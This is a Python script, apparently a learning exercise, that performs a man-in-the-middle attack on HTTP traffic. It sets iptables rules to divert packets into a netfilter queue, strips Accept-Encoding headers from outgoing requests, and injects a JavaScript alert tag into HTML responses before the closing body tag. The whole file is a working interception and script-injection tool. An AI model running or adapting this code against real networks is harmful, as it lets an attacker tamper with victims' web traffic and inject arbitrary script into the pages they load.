#!/root/anaconda3/bin  python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import re

local_computer_test = True


class NetSpoof(object):
    def __init__(self, main_layer, tcp_layer, filter_word, nice_replacement):
        self.check_arguments()
        if self.options.interface:
            self.interface = self.options.interface
        else:
            self.get_interface()
        if self.interface:
            self.spoof_ip = self.get_my_ip()
            self.main_layer = main_layer
            self.tcp_layer = tcp_layer
            self.filter_word = filter_word
            self.ack_list = set()
            self.dickens_bait = nice_replacement

    def check_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-i", "--interface", dest="interface",
                          help="Interface name to work with it for spoofing.")

        (self.options, arguments) = parser.parse_args()
        return self.options

    def get_interface(self):
        machine_data = str(subprocess.check_output(
            r"ifconfig | sed 's/^\(.*\): /\1---\n/g' | sed 's/\s*\(ether.*\)/\1---/g' | sed -n '/.*---/p' | sed 's/---// g'", shell=True)).replace(r"b'", '').replace("'", '').split(r'\n')[:-1]

        start = 1
        relevant_interfaces = {}

        while start < len(machine_data):
            if 'ether' in machine_data[start]:
                relevant_interfaces[start] = machine_data[start - 1]
            start += 1

        print
        "\nThose are available interfaces:{relevant_interfaces}\nPlease choose the interface by index.Insert the number:"

        try:
            self.interface = relevant_interfaces[int(input())]
        except KeyError:
            print('Interface does not exist!!')
            return None
        return self.interface

    def get_my_ip(self):
        return str(subprocess.check_output(
            r"ip route  |  sed -n '/" + self.interface + ".*kernel/ p' | awk '{print $9; exit}'", shell=True)).replace("b'", '').replace(r"\n'", '')

    def set_load(self, packet, modified_load):
        packet[self.main_layer].load = modified_load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[self.tcp_layer].chksum
        print(packet.show())
        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(self.main_layer):
            try:
                if scapy_packet[self.tcp_layer].dport == 80:
                    print("[+] Request")
                    modified_load = re.sub(
                        self.dickens_bait, '', str(scapy_packet[self.main_layer].load).replace("b'", '').replace("'", '')).replace('\\r', '\r').replace('\\n', '\n')
                    packet.set_payload(bytes(self.set_load(
                        scapy_packet, modified_load)))
                elif scapy_packet[self.tcp_layer].sport == 80:
                    print("[+] Response")
                    print(scapy_packet.show())
                    # modified_load = str(scapy_packet[self.main_layer].load).replace("b'", '').replace(
                    #     "'", '').replace("</body>", "<script>alert(\"test\");</script></body>").replace('\\r', '\r').replace('\\n', '\n')
                    # modified_load = str(scapy_packet[self.main_layer].load).replace("'b", '').replace("'", '').replace(
                    #     '\\r', '\r').replace('\\n', '\n')
                    print('***Start')
                    # modified_load = re.sub(r'^b', '', str(scapy_packet[self.main_layer].load).replace(
                    #     "'b", '').replace("'", '').replace('\\r', '\r').replace('\\n', '\n'))
                    modified_load = scapy_packet[self.main_layer].load.decode(
                        "utf-8").replace("</body>", r'<script>alert(location.hostname);</script></body>')

                    print(modified_load)
                    print('***End')

                    packet.set_payload(bytes(self.set_load(
                        scapy_packet, modified_load)))
            except IndexError:
                pass

        packet.accept()


if __name__ == '__main__':

    if local_computer_test:
        subprocess.call(
            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
        subprocess.call(
            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    else:
        subprocess.call(
            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    try:
        sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
                          r'Accept-Encoding:.*?\\r\\n')
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, sp_obj.process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(r'iptables --flush', shell=True)
